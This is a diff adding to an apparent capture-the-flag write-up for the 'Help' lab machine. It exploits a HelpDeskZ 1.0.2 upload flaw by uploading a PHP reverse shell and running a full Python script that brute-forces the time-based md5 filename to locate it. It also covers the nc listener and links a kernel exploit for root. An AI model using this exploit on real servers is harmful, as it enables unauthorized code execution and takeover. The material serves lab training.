@@ -104,6 +104,8 @@ if(!isset($error_msg) && $settings['ticket_attachment']==1){
 
 The most important code: `$filename = md5($_FILES['attachment']['name'].time()).".".$ext;`. We can found the rule of the name of the uploaded file. So it will be possile to find the uploaded attachment. And there is another stuff, when submited a reverse shell php file, you will get a hint: `File not allowed`. However, the attachment has been uploaded. Because it will upload the attachment firstly. And then just give the hint.
 
+![EFrlwj.png](https://s2.ax1x.com/2019/04/21/EFrlwj.png)
+
 ```php
 if (!move_uploaded_file($_FILES['attachment']['tmp_name'], $uploadedfile)) {
 	$show_step2 = true;
@@ -115,3 +117,70 @@ if (!move_uploaded_file($_FILES['attachment']['tmp_name'], $uploadedfile)) {
 		$show_step2 = true;
 		$error_msg = $LANG['INVALID_FILE_EXTENSION'];
 ```
+
+Firstly, submit a ticket with the attachment of `php-reverse-shell.php` and will get error information `File is not allowed`. However, the script has been uploaded actually. Then, try to run the script:
+
+```
+python exploit.py http://10.10.10.121/support/ a.php
+```
+
+In order to decrease the complexity of the md5 hash, the `php-reverse-shell.php` is renamed to `a.php`. However, there are two prblems so that I obtain nothing for the whole afternoon. The first problem is timezone. The uploaded filename depends on the file time. So it is impotant to keep the same timezone for the local machine and the server. We can find that the server timezone is GMT from the response header of Date. So modify the timezone of local machine:
+
+```bash
+timedatectl set-timezone GMT
+```
+
+After modify the timezone, still have not found anthing. It has some problem with the url. Read the source code and you will find the upload directory should be: `UPLOAD_DIR.'tickets/`:
+
+![EFhSUS.png](https://s2.ax1x.com/2019/04/21/EFhSUS.png)
+
+Hence, the url should be `http://10.10.10.121/support/uploads/tickets/`. So run the script:
+
+`python exploit.py http://10.10.10.121/support/uploads/tickets/ a.php`
+
+I have modified the scritp slightly for my own purpose.
+
+```python
+import hashlib
+import time
+import sys
+import requests
+print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'
+
+if len(sys.argv) < 3:
+    print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
+    sys.exit(1)
+
+helpdeskzBaseUrl = sys.argv[1]
+fileName = sys.argv[2]
+
+currentTime = int(time.time())
+
+for x in range(0, 1500):
+    plaintext = fileName + str(currentTime - x)
+    md5hash = hashlib.md5(plaintext).hexdigest()
+
+    url = helpdeskzBaseUrl+md5hash+'.php'
+    print "This is the " + str(x) + " time:"
+    response = requests.head(url)
+    if response.status_code == 200:
+        print "found!"
+        print url
+        sys.exit(0)
+    else:
+        print "has tried " + url + ":" + str(response.status_code)
+
+print "Sorry, I did not find anything"
+```
+
+Remember to set nc listen to port in the begining. After some time, the shell is returned.
+
+![EFhlvR.png](https://s2.ax1x.com/2019/04/21/EFhlvR.png)
+
+## Priv Esc
+
+`Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux`
+
+https://github.com/SecWiki/linux-kernel-exploits/tree/master/2017/CVE-2017-16995
+
+
